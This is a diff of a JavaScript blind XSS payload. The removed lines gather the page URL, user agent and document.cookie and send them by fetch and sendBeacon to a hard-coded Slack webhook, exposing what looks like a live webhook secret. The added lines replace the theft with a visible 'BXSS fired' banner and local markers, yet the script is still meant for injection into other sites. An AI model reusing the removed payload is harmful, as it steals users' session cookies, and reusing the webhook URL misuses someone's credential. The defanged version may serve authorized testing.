@@ -1,22 +1,15 @@
 (function () {
-  const cap = (s, n) => (s || '').toString().slice(0, n);
-  const msg = [
-    'Blind XSS fired',
-    'URL: ' + cap(location.href, 1800),
-    'UA: ' + cap(navigator.userAgent, 1800),
-    'Cookies: ' + cap(document.cookie || 'NA', 1800),
-    'Time: ' + new Date().toISOString()
-  ].join(' | ');
-
-  const SLACK_WEBHOOK = 'https://hooks.slack.com/services/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';
-
-  // Try a simple fetch first (no custom headers to reduce preflight).
   try {
-    fetch(SLACK_WEBHOOK, { method: 'POST', body: JSON.stringify({ text: msg }) });
+    const b = document.createElement('div');
+    b.style = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#111;color:#0f0;padding:6px 8px;font:12px monospace';
+    b.textContent = 'BXSS fired: ' + location.href;
+    document.documentElement.appendChild(b);
   } catch (e) {}
-
-  // Fallback: sendBeacon (opaque, but often succeeds in sending the body).
   try {
-    navigator.sendBeacon && navigator.sendBeacon(SLACK_WEBHOOK, JSON.stringify({ text: msg }));
+    localStorage.setItem('bxss_info', JSON.stringify({ u: location.href, ua: navigator.userAgent, ts: new Date().toISOString() }));
+  } catch (e) {}
+  try {
+    const jitter = 200 + Math.floor(Math.random() * 800);
+    setTimeout(() => { try { document.documentElement.setAttribute('bxss-fired','1'); } catch (e) {} }, jitter);
   } catch (e) {}
 })();
